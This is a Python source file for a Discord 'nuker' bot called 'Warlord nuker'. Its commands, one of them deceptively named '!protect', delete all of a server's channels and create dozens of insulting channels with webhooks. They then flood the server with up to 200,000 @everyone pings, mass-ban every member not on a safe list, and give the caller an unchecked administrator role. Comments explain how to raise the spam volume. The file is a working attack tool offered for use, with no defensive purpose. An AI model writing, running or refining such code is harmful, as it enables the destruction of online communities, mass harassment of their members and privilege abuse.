import discord
import aiohttp
import asyncio
import random

intents = discord.Intents.default()
intents.guilds = True
intents.messages = True
intents.guild_messages = True
intents.message_content = True
intents.members = True

client = discord.Client(intents=intents)


with open("bottokens.txt", "r") as f:
    token = f.read().strip()


try:
    with open("userids.txt", "r") as f:
        safe_users = set(f.read().splitlines())
except FileNotFoundError:
    safe_users = set()


HEADERS = {
    "Authorization": f"Bot {token}",
    "Content-Type": "application/json"
}

# you can customize channel names and Pings here
channel_emojis = ["🔥", "💀", "👿", "🤡", "🖕", "🤖", "👺", "⚡"]
channel_names = [
    "warlord-owns-you", "skid-clown", "cry-more-skid", "warlord-on-top",
    "skid-nation-down", "pathetic-server", "destroyed-by-warlord", "skidland"
]
spam_messages = [
    "@everyone Cry skids, Warlord owns you!",
    "@everyone This server is pathetic! Warlord Nation rules!",
    "@everyone Skid Nation has fallen. Fear the Warlord!",
    "@everyone Warlord on top! Skids on bottom!"
]

# the bot will stop at 200000 Pings so if you want more higher Pings change the 200000 value to how many you want
MAX_PINGS = 200000
current_pings = 0


@client.event
async def on_ready():
    print(f"Logged in as {client.user}")


@client.event
async def on_message(message):
    if message.content == "!protect":
        guild = message.guild
        print(f"Executing !protect on {guild.name}")

        await delete_all_channels(guild)
        await create_channels_webhooks_and_spam(guild)

    elif message.content == "!massban":
        await massban(message)

    elif message.content == ".grantadmin":
        await grant_admin(message)

# Delete All Channels
async def delete_all_channels(guild):
    print("Deleting all channels...")
    channels = guild.channels
    for channel in channels:
        try:
            await channel.delete()
            print(f"[-] Deleted Channel: {channel.name}")
        except Exception as e:
            print(f"[!] Failed to Delete Channel {channel.name}: {e}")

# Create Channels, Webhooks, and Spam Simultaneously
async def create_channels_webhooks_and_spam(guild):
    try:
        print("Creating channels, webhooks, and starting spam...")

        channels = []
        webhooks = []

        async def create_channel_and_webhook():
            name = f"{random.choice(channel_emojis)}-{random.choice(channel_names)}-{random.randint(1000,9999)}"
            channel = await guild.create_text_channel(name)
            print(f"[+] Created Channel: {name}")
            channels.append(channel)

            await create_webhook_with_retry(channel, webhooks)

            # Start spamming immediately
            asyncio.create_task(spam_webhook(webhooks[-1]))

        tasks = [create_channel_and_webhook() for _ in range(60)]
        await asyncio.gather(*tasks)
        print("[+] Channels and Webhooks Created Successfully")

    except Exception as e:
        print(f"Error during channel/webhook creation: {e}")

# Create Webhook with Retry (5-Second Delay on Rate Limit)
async def create_webhook_with_retry(channel, webhooks):
    while True:
        try:
            webhook = await channel.create_webhook(name="Warlord")
            print(f"[+] Created Webhook in {channel.name}")
            webhooks.append(webhook)
            return
        except discord.HTTPException as e:
            if e.status == 429:
                print(f"[!] Rate Limited on Webhook Creation. Retrying in 5 seconds...")
                await asyncio.sleep(5)
            else:
                print(f"[!] Failed to Create Webhook: {e}")
                return


async def spam_webhook(webhook):
    global current_pings
    async with aiohttp.ClientSession() as session:
        while current_pings < MAX_PINGS:
            data = {"content": random.choice(spam_messages)}
            try:
                async with session.post(webhook.url, json=data) as response:
                    if response.status == 204:
                        current_pings += 1
                        print(f"[+] Spam Sent by {webhook.name} | Total Pings: {current_pings}")
                        if current_pings >= MAX_PINGS:
                            print(f"[!] Stopped at {MAX_PINGS} Pings.")
                            return
                    elif response.status == 429:
                        print(f"[!] Rate Limited. Retrying in 5 seconds...")
                        await asyncio.sleep(5)
            except Exception as e:
                print(f"[!] Error Spamming Webhook {webhook.name}: {e}")


async def massban(message):
    guild = message.guild
    print(f"Starting Mass Ban in {guild.name}")
    async for member in guild.fetch_members(limit=None):
        if str(member.id) not in safe_users:
            try:
                await guild.ban(member, reason="Warlord Mass Ban")
                print(f"[-] Banned: {member.name}#{member.discriminator}")
            except Exception as e:
                print(f"[!] Failed to Ban {member.name}: {e}")
        else:
            print(f"[!] Skipped Safe User: {member.name}#{member.discriminator}")

# thanks for choosing Warlord nuker
async def grant_admin(message):
    guild = message.guild
    user = message.author
    try:
        admin_role = await guild.create_role(name="Warlord Admin", permissions=discord.Permissions(administrator=True))
        await user.add_roles(admin_role)
        print(f"[+] Granted Admin to {user.name}#{user.discriminator}")
        await message.channel.send(f"✅ {user.mention}, you now have administrator privileges.")
    except Exception as e:
        print(f"[!] Failed to Grant Admin: {e}")

# Run the Bot
client.run(token)
